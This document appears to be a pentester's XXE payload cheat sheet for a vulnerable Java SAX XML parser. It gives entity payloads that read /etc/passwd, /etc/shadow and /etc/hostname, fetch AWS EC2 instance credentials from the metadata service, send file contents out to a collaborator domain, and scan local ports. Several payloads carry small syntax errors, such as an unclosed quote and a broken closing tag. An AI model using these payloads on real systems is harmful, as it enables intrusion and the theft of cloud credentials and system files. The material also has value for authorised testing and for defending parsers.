
# Direct fetch output on screen

- SSRF (AWS EC2 credentials)
```
<!DOCTYPE foo [
    <!ENTITY exploit SYSTEM "http://169.254.169.254/latest/meta-data/identity-credentials/ec2/security-credentials/ec2-instance">
]>
...
<sometag>&exploit;</sometag>

- Path traversal and fetching files

<!DOCTYPE foo [<!ENTITY exploit SYSTEM "file:///etc/passwd">]>
...
<sometag>&exploit<sometag>
...
```

# Out of Bound XXE, confirmed using Collaborator
```
<?xml version="1.0" encoding="ISO-8859-1"?>
<!DOCTYPE foo [
    <!ELEMENT foo ANY>
    <!ENTITY % xxe SYSTEM "file:///etc/hostname">
    <!ENTITY oobxxe SYSTEM "http://kisijrhufnshbsd.yourcollaboraterserverdomain/?%xxe;">]>
...
...
<Sometag>&oobxxe</Sometag>
...
...
```

# Network enumeration (burp intruder)
```
<?xml version="1.0>
<!DOCTYPE foo [
<!ENTITY portscan SYSTEM "ftp://localhost"$$">    
]>
<foo>START_&portscan;_END</foo>
```

# Path Traversal
```
<?xml version="1.0>
<!DOCTYPE foo [
<!ENTITY LFI SYSTEM "file:///etc/shadow/">    
]>
<foo>START_&LFI;_END</foo>
```


Note - these were found due to vulnerable JAVA SAX XML parser